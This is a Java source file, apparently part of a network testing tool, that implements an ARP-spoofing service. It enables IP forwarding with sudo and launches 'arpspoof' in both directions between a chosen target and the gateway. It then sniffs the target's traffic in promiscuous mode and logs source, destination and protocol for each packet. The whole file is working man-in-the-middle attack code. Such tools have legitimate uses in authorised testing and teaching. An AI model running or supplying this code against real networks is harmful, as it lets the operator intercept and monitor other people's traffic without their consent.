package org.npt.services.defaults;

import javafx.util.Pair;
import lombok.Builder;
import lombok.Getter;
import lombok.SneakyThrows;
import org.npt.models.DefaultPacket;
import org.npt.models.Gateway;
import org.npt.models.Target;
import org.npt.services.ArpSpoofService;
import org.pcap4j.core.*;
import org.pcap4j.packet.*;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.CopyOnWriteArrayList;

public class DefaultArpSpoofService implements ArpSpoofService {

    private static final String COMMAND = "sudo arpspoof -i %s -t %s %s";

    private static final String KEY_BUILDER = "Target : %s , Gateway : %s";

    private static ArpSpoofService instance = null;

    @Getter
    private final List<ArpSpoofProcess> arpSpoofProcesses = new ArrayList<>();

    private DefaultArpSpoofService() {
        execute(new String[]{"sudo sysctl -w net.ipv4.ip_forward=1"});
    }

    @Override
    public Optional<ArpSpoofProcess> getArpSpoofProcess(Target target) {
        return arpSpoofProcesses.stream()
                .filter(packetSniffer -> target.equals(packetSniffer.target()))
                .findAny();
    }

    @Override
    public void stop(ArpSpoofProcess arpSpoofProcess) {
        Thread thread = new Thread(() -> {
            arpSpoofProcess.tasksThreads().forEach(pair -> {
                pair.getValue().destroy();
                pair.getKey().interrupt();
            });
            arpSpoofProcess.packetSnifferThreadPair.getValue().stop();
            arpSpoofProcess.packetSnifferThreadPair.getKey().interrupt();
            arpSpoofProcesses.remove(arpSpoofProcess);
        });
        thread.setPriority(Thread.MAX_PRIORITY);
        thread.start();
    }

    @Override
    public void spoof(final String scanInterface, final Target target, final Gateway gateway) {

        final String targetIp = target.getIp();
        final String gatewayIp = gateway.getIp();
        final String commandFirst = String.format(COMMAND, scanInterface, targetIp, gatewayIp);
        final String commandSecond = String.format(COMMAND, scanInterface, gatewayIp, targetIp);
        final String processName = generateProcessNameFrom(String.format(KEY_BUILDER, targetIp, gatewayIp));
        final Pair<Thread, Task> taskTargetToGateway = execute(new String[]{commandFirst});
        final Pair<Thread, Task> taskGatewayToTarget = execute(new String[]{commandSecond});
        final DeviceSniffer deviceSniffer = new DeviceSniffer(target, scanInterface);
        final Thread packetSnifferThread = new Thread(deviceSniffer);
        packetSnifferThread.start();
        final ArpSpoofProcess arpSpoofProcess = ArpSpoofProcess.builder()
                .key(processName)
                .target(target)
                .gateway(gateway)
                .packetSnifferThreadPair(new Pair<>(packetSnifferThread, deviceSniffer))
                .tasksThreads(Arrays.asList(taskTargetToGateway, taskGatewayToTarget))
                .build();
        this.arpSpoofProcesses.add(arpSpoofProcess);
    }

    @Override
    public void clear() {
        arpSpoofProcesses.forEach(arpSpoofProcess -> {
            arpSpoofProcess.tasksThreads().forEach(pair -> {
                pair.getValue().destroy();
                pair.getKey().interrupt();
            });
            arpSpoofProcess.packetSnifferThreadPair().getKey().interrupt();
        });
        arpSpoofProcesses.clear();
    }

    public static ArpSpoofService getInstance() {
        if (instance == null)
            instance = new DefaultArpSpoofService();
        return instance;
    }

    @Builder
    public record ArpSpoofProcess(String key, Target target, Gateway gateway,
                                  Pair<Thread, DeviceSniffer> packetSnifferThreadPair,
                                  List<Pair<Thread, Task>> tasksThreads) {

    }

    @Getter
    public static class Task implements Runnable {

        private Process process;
        private final String command;

        public Task(final String command) {
            this.command = command;
        }

        public void destroy() {
            process.destroy();
        }

        @SneakyThrows
        @Override
        public void run() {
            process = Runtime.getRuntime().exec(command.split(" "));
        }
    }

    public static class DeviceSniffer implements Runnable {

        private final Target target;

        private final String networkInterface;

        private PcapHandle handle;

        @Getter
        private final List<DefaultPacket> defaultPackets = new CopyOnWriteArrayList<>();

        private boolean running = true;

        public DeviceSniffer(Target target, String networkInterface) {
            this.target = target;
            this.networkInterface = networkInterface;
        }

        @Override
        public void run() {
            try {
                sniff();
                while (running) {
                    Packet packet = handle.getNextPacket();
                    if (packet != null) {
                        processPacket(packet);
                    }
                }
            } catch (NotOpenException | PcapNativeException e) {
                stop();
            }
        }

        private void processPacket(Packet packet) {
            String srcIp = null;
            String dstIp = null;
            String type = "UNKNOWN";

            // Handle ARP
            ArpPacket arp = packet.get(ArpPacket.class);
            if (arp != null) {
                srcIp = arp.getHeader().getSrcProtocolAddr().getHostAddress();
                dstIp = arp.getHeader().getDstProtocolAddr().getHostAddress();
                type = "ARP";
            }

            // Handle IPv4 or IPv6
            IpV4Packet ipv4 = packet.get(IpV4Packet.class);
            if (ipv4 != null) {
                srcIp = ipv4.getHeader().getSrcAddr().getHostAddress();
                dstIp = ipv4.getHeader().getDstAddr().getHostAddress();
                Packet payload = ipv4.getPayload();
                type = getPayloadType(payload);
            }

            IpV6Packet ipv6 = packet.get(IpV6Packet.class);
            if (ipv6 != null) {
                srcIp = ipv6.getHeader().getSrcAddr().getHostAddress();
                dstIp = ipv6.getHeader().getDstAddr().getHostAddress();
                Packet payload = ipv6.getPayload();
                type = getPayloadType(payload);
            }

            // Fallback to Ethernet
            if (srcIp == null || dstIp == null) {
                EthernetPacket eth = packet.get(EthernetPacket.class);
                if (eth != null && eth.getPayload() != null) {
                    processPacket(eth.getPayload());
                    return;
                }
            }

            if (srcIp == null || dstIp == null) return;

            DefaultPacket defaultPacket = DefaultPacket.builder()
                    .srcIp(srcIp)
                    .dstIp(dstIp)
                    .type(type)
                    .build();

            System.out.println(srcIp + " -----> " + dstIp);
            defaultPackets.add(defaultPacket);
        }

        private String getPayloadType(Packet payload) {
            switch (payload) {
                case null -> {
                    return "UNKNOWN";
                }
                case TcpPacket tcp -> {
                    int port = tcp.getHeader().getDstPort().valueAsInt();
                    if (port == 22) return "SSH";
                    if (port == 53) {
                        return "DNS";
                    }
                    return "TCP";
                }
                case UdpPacket udp -> {
                    int port = udp.getHeader().getDstPort().valueAsInt();
                    if (port == 53) {
                        return "DNS";
                    }
                    return "UDP";
                }
                case IcmpV4CommonPacket ignored -> {
                    return "ICMPv4";
                }
                case IcmpV6CommonPacket ignored -> {
                    return "ICMPv6";
                }
                default -> {
                }
            }

            return payload.getClass().getSimpleName();
        }

        public void sniff() throws PcapNativeException, NotOpenException {
            PcapNetworkInterface device = Pcaps.getDevByName(networkInterface);
            if (device == null) {
                return;
            }

            handle = device.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
            final String ip = target.getIp();
            final String filter = "ip src " + ip + " or ip dst " + ip;
            handle.setFilter(filter, BpfProgram.BpfCompileMode.NONOPTIMIZE);
        }

        public void stop() {
            if (handle != null && handle.isOpen()) {
                handle.close();
            }
            running = false;
        }
    }

    // Privates
    private Pair<Thread, Task> execute(String[] command) {
        String commandString = String.join(" ", command);
        Task task = new Task(commandString);
        Thread thread = new Thread(task);
        thread.start();
        return new Pair<>(thread, task);
    }

    private String generateProcessNameFrom(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder hexString = new StringBuilder();
            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException ignored) {
            return null;
        }
    }
}
